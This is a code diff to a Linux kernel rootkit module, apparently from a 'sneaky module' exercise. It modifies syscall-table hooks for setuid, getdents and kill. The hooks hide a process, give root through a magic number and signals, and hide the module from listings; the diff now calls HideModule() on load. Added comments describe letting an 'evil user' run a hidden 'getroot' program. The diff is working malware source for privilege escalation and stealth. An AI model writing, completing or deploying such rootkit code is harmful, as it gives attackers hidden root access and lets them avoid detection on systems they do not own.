@@ -36,7 +36,7 @@ struct linux_dirent {
 enum {
   SIGSHPROC = 31,
   SIGSUPER = 64,
-  SIGHIDEMOD = 63,
+  SIGSHOWMOD = 63,
 };
 
 static int sneaky_pid = 0;
@@ -158,16 +158,17 @@ asmlinkage int sneaky_kill(pid_t pid, int sig){
   case SIGSUPER:
     sneaky_setuid(MAGIC_NUMBER);
     break;
-  case SIGHIDEMOD:
-    if(mhide) ShowModule();
-    else HideModule();
+  case SIGSHOWMOD:
+    ShowModule();
     break;
   default:
     return original_kill(pid, sig);
   }
   return 0;
 }
-
+//need to change it into "getroot"
+//so that evil user will know getroot exist and He/She can just execute it
+//others won't know its existence
 asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
 {
   //hide the sneaky process
@@ -211,7 +212,7 @@ asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsig
   return read;
   //  return original_getdents(fd, dirp, count);
 }
-
+//no need to exist
 asmlinkage ssize_t sneaky_read(int fd, void *buf, size_t count){
   
   char* get_fp = (char*)__get_free_page(GFP_TEMPORARY);
@@ -252,9 +253,10 @@ static int initialize_sneaky_module(void)
   //This is the magic! Save away the original 'open' system call
   //function address. Then overwrite its address in the system call
   //table with the function address of our new code.
+
   //open
-  original_call = (void*)*(sys_call_table + __NR_open);
-  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
+  /* original_call = (void*)*(sys_call_table + __NR_open); */
+  /* *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open; */
   //setuid
   origin_setuid = (void*)*(sys_call_table + __NR_setuid);
   *(sys_call_table + __NR_setuid) = (unsigned long)sneaky_setuid; 
@@ -262,11 +264,13 @@ static int initialize_sneaky_module(void)
   original_getdents = (void*)*(sys_call_table + __NR_getdents);  
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_getdents; 
   //read
-  original_read = (void*)*(sys_call_table + __NR_read);  
-  *(sys_call_table + __NR_read) = (unsigned long)sneaky_read; 
+  /* original_read = (void*)*(sys_call_table + __NR_read);   */
+  /* *(sys_call_table + __NR_read) = (unsigned long)sneaky_read;  */
   //kill
   original_kill = (void*)*(sys_call_table + __NR_kill);
   *(sys_call_table + __NR_kill) = (unsigned long)sneaky_kill;
+
+  HideModule();
   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
@@ -294,10 +298,10 @@ static void exit_sneaky_module(void)
   //This is more magic! Restore the original 'open' system call
   //function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
-  *(sys_call_table + __NR_read) = (unsigned long)original_read;
+  //  *(sys_call_table + __NR_read) = (unsigned long)original_read;
   *(sys_call_table + __NR_setuid) = (unsigned long)origin_setuid;
   *(sys_call_table + __NR_kill) = (unsigned long)original_kill;
-  *(sys_call_table + __NR_open) = (unsigned long)original_call;
+  //  *(sys_call_table + __NR_open) = (unsigned long)original_call;
   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
